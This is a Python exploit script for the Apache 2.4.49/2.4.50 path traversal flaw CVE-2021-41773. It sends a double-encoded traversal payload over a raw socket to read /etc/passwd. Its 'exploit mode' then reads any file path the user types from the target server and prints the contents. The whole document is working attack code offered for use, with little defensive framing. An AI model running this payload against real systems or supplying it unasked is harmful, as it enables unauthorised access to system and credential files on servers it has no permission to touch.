# Apache HTTP Server 2.4.49, 2.4.50

# Regex:
# ^2\.4\.(49|50)$

# Path Traversal



import requests
import argparse
import socket
from urllib.parse import urlparse


# Send request with /etc/passwd directory to check vulnerable
def vulnerable_check(host, port):
    test_payload = "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
    test_response_str  = send_request(host, port, test_payload)
    
    status_line = test_response_str.splitlines()[0]  
    test_status = status_line.split()[1]  

    if test_status == "200":
        print("[+] Detected Vulnerability : True\n")
    else:
        print("[-] Detected Vulnerability : False\n")


# Send attack payload as raw type to avoid encoding/decoding
def send_request(host, port, dir):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    request = f"GET {dir} HTTP/1.1\r\n" \
              f"Host: {host}\r\n" \
              f"Connection: close\r\n\r\n"

    sock.sendall(request.encode('utf-8'))
    
    response = b""
    while True:
        chunk = sock.recv(4096) 
        if not chunk:
            break
        response += chunk
    
    return response.decode('utf-8')


parser = argparse.ArgumentParser(usage="""CVE-2021-41773.py -u https://*.*.*.*/ -m y""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--mode', '-m', help='Exploit mode (y/n)', required=False)
args = parser.parse_args()

# Parsing URL as protocol, host, path
parsed_url = urlparse(args.URL)
host = parsed_url.hostname            
port = parsed_url.port if parsed_url.port else 8080


if not port:
    print("There should be port number in hostname")

if host == "localhost":
    host = "127.0.0.1"
    

vulnerable_check(host, port)


if args.mode:
    m = args.mode.strip().lower()
    
    if m == 'y':
        # Get user's directory payload and send request as raw type 
        user_payload = input("Directory to inject ex)/etc/passwd : ")
        inject_payload = "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65" + user_payload
        print("\n")
        print("*" * 100)
        print("Sending payload : " + inject_payload)
        print("*" * 100)

        response_str  = send_request(host, port, inject_payload)

        status_line = response_str.splitlines()[0]  
        status = status_line.split()[1] 

        if status == "200":
            print("\nSuccess Attack!!\n")
            print(response_str)
        else:
            print("Error occured in sending attack")
    elif m == 'n':
        print("Checking vulnerability finish.")

    else:
        print("Invalid mode choice")
